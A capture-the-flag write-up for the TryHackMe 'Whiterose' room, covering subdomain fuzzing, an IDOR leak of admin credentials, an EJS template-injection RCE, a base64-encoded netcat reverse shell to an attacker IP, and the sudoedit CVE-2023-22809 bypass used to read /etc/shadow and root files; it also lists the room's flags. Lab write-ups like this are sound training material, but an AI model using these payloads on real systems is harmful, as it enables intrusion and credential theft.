## Whiterose - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/whiterose)

Welcome to Whiterose
This challenge is based on the Mr. Robot episode "409 Conflict". Contains spoilers!

Go ahead and start the machine, it may take a few minutes to fully start up.

And oh! I almost forgot! - You will need these: `Olivia Cortez:olivi8`

**IP: 10.10.154.1**

**Replace [YOUR-THM-IP] with your own machine IP assigned by TryHackMe.**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation, Web <br>

**Tools Used**: Nmap, Ffuf, Burp Suite<br>

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Starting off with Nmap scan and subdomain fuzzing since Gobuster found nothing. Also add ip to `/etc/hosts` as `cyprusbank.thm`.

  ```
  nmap -sC -sV -p- 10.10.154.1

  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   2048 b9:07:96:0d:c4:b6:0c:d6:22:1a:e4:6c:8e:ac:6f:7d (RSA)
  |   256 ba:ff:92:3e:0f:03:7e:da:30:ca:e3:52:8d:47:d9:6c (ECDSA)
  |_  256 5d:e4:14:39:ca:06:17:47:93:53:86:de:2b:77:09:7d (ED25519)
  80/tcp open  http    nginx 1.14.0 (Ubuntu)
  |_http-server-header: nginx/1.14.0 (Ubuntu)
  |_http-title: Site doesn't have a title (text/html).
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  ```

  ```
  ffuf -w /seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://cyprusbank.thm/ -H "Host:FUZZ.cyprusbank.thm" -fw 1
  www                     [Status: 200, Size: 252, Words: 19, Lines: 9, Duration: 52ms]
  admin                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 235ms]
  :: Progress: [114442/114442] :: Job [1/1] :: 826 req/sec :: Duration: [0:02:23] :: Errors: 0 ::
  ```
  
- When you visit admin subdomain you will see a login page. Login with provided credentials and go to `Messages`. 

---

## 🌐 Web Exploitation 

- In the messages section there is and easy IDOR that will give us admin access.

  ```
  http://admin.cyprusbank.thm/messages/?c=0

  Cyprus National Bank - Admin Chat

  DEV TEAM: Thanks Gayle, can you share your credentials? We need privileged admin account for testing
  
  Gayle Bev: Of course! My password is 'p~]P@5!6;rs558:q'
  
  DEV TEAM: Alright we are trying to implement chat history, everything should be ready in week or so
  
  Gayle Bev: That's nice to hear!
  
  Gayle Bev: Developers implemented this new messaging feature that I suggested! What you guys think?
  
  Greger Ivayla: Looks really cool!
  
  Jemmy Laurel: Hey have you guys seen Mrs. Jacobs recently??
  
  Olivia Cortez: No she hasn't been around for a while
  
  Jemmy Laurel: Oh, is she OK?
  ```
  
- Logout and use newly found credentials to login as admin Greg and get the phone number.

- As admin, you can change usernames and password and that will give us SSTI. In order to confirm it, intercept the request with Burp and remove a password parameter from request then send it.

  ```
  Request:

  POST /settings HTTP/1.1
  Host: admin.cyprusbank.thm
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate, br
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 17
  Origin: http://admin.cyprusbank.thm
  Connection: keep-alive
  Referer: http://admin.cyprusbank.thm/settings
  Cookie: connect.sid=s%3Abiprtej0QHoKj7Dm4jk_nVcRJuihb-Xn.VgPcSlULhT2NSNaN3TfsZtyqoD01cKuLK9Qbfww4LgY
  Upgrade-Insecure-Requests: 1
  Priority: u=0, i
  
  name=a
  ```
  
- For testing SSTI, I used this payload `%%1");process.mainModule.require('child_process').execSync('curl http://[YOUR-THM-IP]');//`.

  ```
  POST /settings HTTP/1.1
  Host: admin.cyprusbank.thm
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate, br
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 145
  Origin: http://admin.cyprusbank.thm
  Connection: keep-alive
  Referer: http://admin.cyprusbank.thm/settings
  Cookie: connect.sid=s%3Abiprtej0QHoKj7Dm4jk_nVcRJuihb-Xn.VgPcSlULhT2NSNaN3TfsZtyqoD01cKuLK9Qbfww4LgY
  Upgrade-Insecure-Requests: 1
  Priority: u=0, i
  
  name=a&password=b&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('curl http://[YOUR-THM-IP]');//
  
  $ python3 -m http.server 80
  Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
  10.10.154.1 - - [06/Jun/2025 21:40:21] "GET / HTTP/1.1" 200 -
  10.10.154.1 - - [06/Jun/2025 21:40:22] "GET / HTTP/1.1" 200 -
  10.10.154.1 - - [06/Jun/2025 21:40:22] "GET / HTTP/1.1" 200 -
  ```

- Awesome! SSTI confirmed since I got a connection on my Python server. Now, instead of curling nothing let's do a reverse shell. You will need to encode your reverse shell with base64.

  ```
  POST /settings HTTP/1.1
  Host: admin.cyprusbank.thm
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate, br
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 200
  Origin: http://admin.cyprusbank.thm
  Connection: keep-alive
  Referer: http://admin.cyprusbank.thm/settings
  Cookie: connect.sid=s%3Abiprtej0QHoKj7Dm4jk_nVcRJuihb-Xn.VgPcSlULhT2NSNaN3TfsZtyqoD01cKuLK9Qbfww4LgY
  Upgrade-Insecure-Requests: 1
  Priority: u=0, i
  
  name=a&password=b&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('bash -c "echo YnVzeWJveCBuYyAxMC44LjEyMC41MiA0NDQ0IC1lIHNo | base64 -d | bash"');//
  
  nc -lvnp 4444
  listening on [any] 4444 ...
  connect to [YOUR-THM-IP] from (UNKNOWN) [10.10.154.1] 55748
  whoami
  web
  id
  uid=1001(web) gid=1001(web) groups=1001(web)
  ```
  
---

## 🧍 User Privilege Escalation

- First flag is already there, moving to root now.

  ```
  web@cyprusbank:~$ ls -al
  total 52
  drwxr-xr-x 9 web  web  4096 Apr  4  2024 .
  drwxr-xr-x 3 root root 4096 Jul 16  2023 ..
  drwxr-xr-x 7 web  web  4096 Jul 17  2023 app
  lrwxrwxrwx 1 web  web     9 Jul 16  2023 .bash_history -> /dev/null
  -rw-r--r-- 1 web  web   220 Jul 15  2023 .bash_logout
  -rw-r--r-- 1 web  web  3968 Jul 15  2023 .bashrc
  drwx------ 2 web  web  4096 Dec 16  2023 .cache
  drwx------ 3 web  web  4096 Dec 16  2023 .gnupg
  drwxr-xr-x 3 web  web  4096 Jul 16  2023 .local
  drwxrwxr-x 4 web  web  4096 Jul 16  2023 .npm
  drwxrwxr-x 8 web  web  4096 Jul 15  2023 .nvm
  drwxrwxr-x 5 web  web  4096 Jun  6 20:00 .pm2
  -rw-r--r-- 1 web  web   807 Jul 15  2023 .profile
  -rw-r--r-- 1 root root   35 Jul 15  2023 user.txt
  
  web@cyprusbank:~$ cat user.txt 
  THM{4lways_upd4te_uR_d3p3nd3nc!3s}
  ```
  
---

## 👑 Root Privilege Escalation

- After running `sudo -l`, I got this.

  ```
  web@cyprusbank:~$ sudo -l
  Matching Defaults entries for web on cyprusbank:
      env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
      XFILESEARCHPATH XUSERFILESEARCHPATH",
      secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
      mail_badpass
  
  User web may run the following commands on cyprusbank:
      (root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
  ```
  
- OK, sudoedit is our way to root. I found these two articles really helpfull. [First](https://www.vicarius.io/vsociety/posts/cve-2023-22809-sudoedit-bypass-analysis), [second](https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf).
  
- We will exploit the vulnerable sudo version by using `vi`.

  ```
  web@cyprusbank:~$ sudo --version
  Sudo version 1.9.12p1
  Sudoers policy plugin version 1.9.12p1
  Sudoers file grammar version 48
  Sudoers I/O plugin version 1.9.12p1
  Sudoers audit plugin version 1.9.12p1
  ```

- Exploit is pretty straightforward. To confirm the vulnerability I ran it on `/etc/shadow` since we don't have any permissions for that file.

  ```
  web@cyprusbank:~$ export EDITOR="vi -- /etc/shadow"

  web@cyprusbank:~$ sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
  
  root:$6$LVAc0zJV$81N7Ge4HhMb/U9A/kaL6Px0vay4rEKfNnrZSVbktE2aQxM6Tudl1/ex6tJq6fYFF
  PiOg7WhINFagng4ryejN8e1:19554:0:99999:7:::
  daemon:*:18885:0:99999:7:::
  bin:*:18885:0:99999:7:::
  sys:*:18885:0:99999:7:::
  sync:*:18885:0:99999:7:::
  games:*:18885:0:99999:7:::
  man:*:18885:0:99999:7:::
  lp:*:18885:0:99999:7:::
  mail:*:18885:0:99999:7:::
  news:*:18885:0:99999:7:::
  uucp:*:18885:0:99999:7:::
  proxy:*:18885:0:99999:7:::
  www-data:*:18885:0:99999:7:::
  backup:*:18885:0:99999:7:::
  list:*:18885:0:99999:7:::
  irc:*:18885:0:99999:7:::
  gnats:*:18885:0:99999:7:::
  nobody:*:18885:0:99999:7:::
  systemd-network:*:18885:0:99999:7:::
  systemd-resolve:*:18885:0:99999:7:::
  syslog:*:18885:0:99999:7:::
  messagebus:*:18885:0:99999:7:::
  "/var/tmp/shadow.vIf4O22I" 31L, 1052C                         1,1           Top
  ```

- Vulnerability confirmed. Now read the flag like a pro!

  ```
  web@cyprusbank:~$ export EDITOR="vi -- /root/root.txt"
  web@cyprusbank:~$ sudo sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
  THM{4nd_uR_p4ck4g3s}
  ~                                                                               
  ~                                                                               
  ~                                                                               
  ~                                                                               
  ~                                                                               
  ~                                                                               
  ~                                                                               
  ~                                                                               
  ~                                                                               
  ~                                                                               
  ~                                                                               
  ~                                                                               
  ~                                                                               
  ~                                                                               
  ~                                                                               
  ~                                                                               
  ~                                                                               
  ~                                                                               
  ~                                                                               
  ~                                                                               
  ~                                                                               
  ~                                                                               
  "/var/tmp/rootYCbVIbFH.txt" 1L, 21C                           1,1           All
  ```

---

## 🏁 Flags

- **Tyrell's Phone Number**: `842-029-5701`
- **User Flag**: `THM{4lways_upd4te_uR_d3p3nd3nc!3s}`
- **Root Flag**: `THM{4nd_uR_p4ck4g3s}`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Getting initial access.`

- What did I learn?
  `How to abuse SSTI.`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
